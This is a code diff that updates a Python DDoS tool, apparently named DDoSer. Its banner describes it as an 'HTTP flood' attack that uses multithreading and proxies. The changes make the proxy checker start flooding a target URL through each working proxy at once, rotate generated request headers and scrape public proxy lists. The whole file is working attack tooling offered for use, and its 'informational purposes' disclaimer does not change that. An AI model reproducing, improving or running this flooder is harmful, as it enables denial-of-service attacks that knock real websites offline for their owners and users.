@@ -1,19 +1,12 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 # Dev: FSystem88
-import requests as r, os, threading, sys, random, re, time, click
+# Version: 3
+
+import requests as r, os, threading, sys, random, re, time, click, fake_headers
 from threading import Thread
 from colorama import Fore,Style
-
-def check_prox(array, qtime):
-	ip = r.post("http://fsystem88.ru/ip").text
-	open("ddprox.txt", "w+").close()
-	for prox in array:
-		thread_list = []
-		t = threading.Thread (target=check, args=(ip, prox, qtime))
-		thread_list.append(t)
-		t.start()
-	time.sleep(qtime*4)
+from fake_headers import Headers
 
 def clear(): 
 	if os.name == 'nt': 
@@ -21,53 +14,32 @@ def clear():
 	else: 
 		os.system('clear')
 
-def useragent():
-	global randuser
-	randuser =['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, как Gecko) Chrome/80.0.3987.163 Safari/537.36 OPR/67.0.3575.137',
-	'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, как Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115',
-	'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv: 75.0) Gecko/20100101 Firefox/75.0',
-	'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv: 74.0) Gecko/20100101 Firefox/74.0',
-	'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv: 75.0) Gecko/20100101 Firefox/75.0',
-	'Mozilla/5.0 (Windows NT 10.0; rv: 68.0) Gecko/20100101 Firefox/68.0',
-	'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, как Gecko) Chrome/80.0.3987.163 Safari/537.36',
-	'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, как Gecko) Chrome/81.0.4044.92 Safari/537.36',
-	'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, как Gecko) Chrome/80.0.3987.163 Safari/537.36',
-	'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/605.1.15 (KHTML, как Gecko) Версия/13.1 Safari/605.1.15',
-	'Mozilla/5.0 (Linux; Android 10; MAR-LX1H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36',
-	'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2986.42 Safari/537.36']
+def check_prox(array, qtime, url):
+	ip = r.post("http://fsystem88.ru/ip").text
+	for prox in array:
+		thread_list = []
+		t = threading.Thread (target=check, args=(ip, prox, qtime, url))
+		thread_list.append(t)
+		t.start()
 
-def randomString(size):
-	out_str = ''
-	for i in range(0, size):
-		a = random.randint(65, 90)
-		out_str += chr(a)
-	return(out_str)
-
-def check(ip, prox, qtime):
+def check(ip, prox, qtime, url):
 	try:
 		ipx = r.get("http://fsystem88.ru/ip", proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}, timeout=qtime).text
 	except:
 		ipx = ip
 	if ip != ipx:
-		print(Fore.GREEN+"{} good!".format(prox))
-		f = open("ddprox.txt", "a+")
-		f.write("{}\n".format(prox))
-		f.close()
+		print(Fore.GREEN+"{} good! Starting...".format(prox)+Style.RESET_ALL)
+		thread_list = []
+		t = threading.Thread (target=ddos, args=(prox, url))
+		thread_list.append(t)
+		t.start()
 
 def ddos(prox, url):
-	useragent()
 	proxies={"http":"http://{}".format(prox), "https":"http://{}".format(prox)}
 	colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
 	color = random.choice(colors)
-	headers = {
-			'User-Agent': random.choice(randuser),
-			'Cache-Control': 'no-cache',
-			'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
-			'Referer': 'http://www.google.com/?q=' + randomString(random.randint(5,10)),
-			'Keep-Alive': str(random.randint(110,120)),
-			'Connection': 'keep-alive'
-			}
 	while True:
+		headers = Headers(headers=True).generate()
 		thread_list = []
 		t = threading.Thread (target=start_ddos, args=(prox, url, headers, proxies, color))
 		thread_list.append(t)
@@ -86,7 +58,6 @@ def start_ddos(prox, url, headers, proxies, color):
 @click.option('--url', '-u', help="URL")
 def main(proxy, url):
 	clear()
-	
 	def logo():
 		print(Fore.GREEN+"\n██████"+Fore.RED+"╗░"+Fore.GREEN+"██████"+Fore.RED+"╗░░"+Fore.GREEN+"█████"+Fore.RED+"╗░░"+Fore.GREEN+"██████"+Fore.RED+"╗"+Fore.GREEN+"███████"+Fore.RED+"╗"+Fore.GREEN+"██████"+Fore.RED+"╗░"+Fore.GREEN+"\n"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔════╝"+Fore.GREEN+"██"+Fore.RED+"╔════╝"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"\n"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║╚"+Fore.GREEN+"█████"+Fore.RED+"╗░"+Fore.GREEN+"█████"+Fore.RED+"╗░░"+Fore.GREEN+"██████"+Fore.RED+"╔╝"+Fore.GREEN+"\n"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║░╚═══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔══╝░░"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"\n"+Fore.GREEN+"██████"+Fore.RED+"╔╝"+Fore.GREEN+"██████"+Fore.RED+"╔╝╚"+Fore.GREEN+"█████"+Fore.RED+"╔╝"+Fore.GREEN+"██████"+Fore.RED+"╔╝"+Fore.GREEN+"███████"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"\n"+Fore.RED+"╚═════╝░╚═════╝░░╚════╝░╚═════╝░╚══════╝╚═╝░░╚═╝"+Fore.YELLOW+"\n\n[ Dev: FSystem88 ~ prod. by Ca$h&Мир ]\n[ The program uses a simple type of DDoS attack\n  \"HTTP flood\" using multithreading and a proxies ]\n[ The program was created for informational purposes !!! ]\n\n"+Fore.GREEN+"[  Qiwi: https://qiwi.com/n/FSYSTEM88  ]\n"+Style.RESET_ALL)
 	logo()
@@ -96,7 +67,7 @@ def main(proxy, url):
 		print(Fore.RED+"Enter the full URL (example: http*://****.**/)"+Style.RESET_ALL)
 		exit()
 	if proxy == None:
-		req = r.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http")
+		req = r.get("https://api.proxyscrape.com/?request=displayproxies")
 		array = req.text.split()
 		qtime = input("Timeout of requests (default 5): ")
 		try:
@@ -107,43 +78,23 @@ def main(proxy, url):
 		except:
 			print(Fore.RED+"Incorrect timeout"+Style.RESET_ALL)
 			exit()
-		check_prox(array, qtime)
-		proxfile = "ddprox.txt"
+		check_prox(array, qtime, url)
 	else:
 		try:
 			fx = open(proxy)
 			array = fx.read().split()
-			val = input("Found {} proxies in {}.\nCheck the proxy for validity? (y/n) ".format(len(array), proxy))
-			if val == "y":
-				qtime = input("Timeout of requests (default 5): ")
-				try:
-					if qtime == "":
-						qtime = 5
-					else:
-						qtime = int(qtime)
-				except:
-					print(Fore.RED+"Incorrect timeout"+Style.RESET_ALL)
-					exit()
-				check_prox(array, qtime)
-			else:
-				print(Fore.YELLOW+"Cancel..."+Style.RESET_ALL)
-			proxfile = proxy
+			qtime = input("Found {} proxies in {}.\nTimeout of requests (default 5): ".format(len(array), proxy))
+			try:
+				if qtime == "":
+					qtime = 5
+				else:
+					qtime = int(qtime)
+			except:
+				print(Fore.RED+"Incorrect timeout"+Style.RESET_ALL)
+				exit()
+			check_prox(array, qtime, url)
 		except FileNotFoundError:
 			print(Fore.RED+"File {} not found.".format(proxy)+Style.RESET_ALL)
 			exit()
-
-	
-
-	clear()
-	logo()
-	fx = open(proxfile)
-	xprox = fx.read().split()
-	print(Fore.YELLOW+"URL: {}".format(url))
-	print("Found {} proxies. Let's go...".format(len(xprox)))
-	for prox in xprox:
-		thread_list = []
-		t = threading.Thread (target=ddos, args=(prox, url))
-		thread_list.append(t)
-		t.start()
 
 main()
